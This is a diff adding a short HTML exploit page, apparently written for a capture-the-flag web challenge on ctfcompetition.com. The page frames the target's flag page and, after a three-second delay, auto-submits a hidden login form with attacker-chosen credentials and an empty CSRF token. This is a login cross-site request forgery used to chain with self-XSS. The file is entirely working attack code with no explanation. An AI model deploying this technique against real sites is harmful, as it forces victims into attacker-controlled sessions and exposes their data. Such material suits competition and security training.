@@ -1,0 +1,21 @@
+<html>
+    <head>
+    </head>
+    <body>
+        <iframe id="flag" src="https://typeselfsub.web.ctfcompetition.com/flag" > </iframe>
+        <iframe id="login" srcdoc='
+            <html>
+                <head>
+                </head>
+                <body>
+                    <form action="https://typeselfsub.web.ctfcompetition.com/login" method="post"> <input name="username" value="hogefuga" > <input name="password" value="hogefuga"> <input name="csrf" > </form>
+                </body>
+            </html>
+        '> </iframe>
+        <script>
+            setTimeout(function() {
+                login.contentWindow.document.forms[0].submit();
+            }, 3000);
+        </script>
+    </body>
+</html>
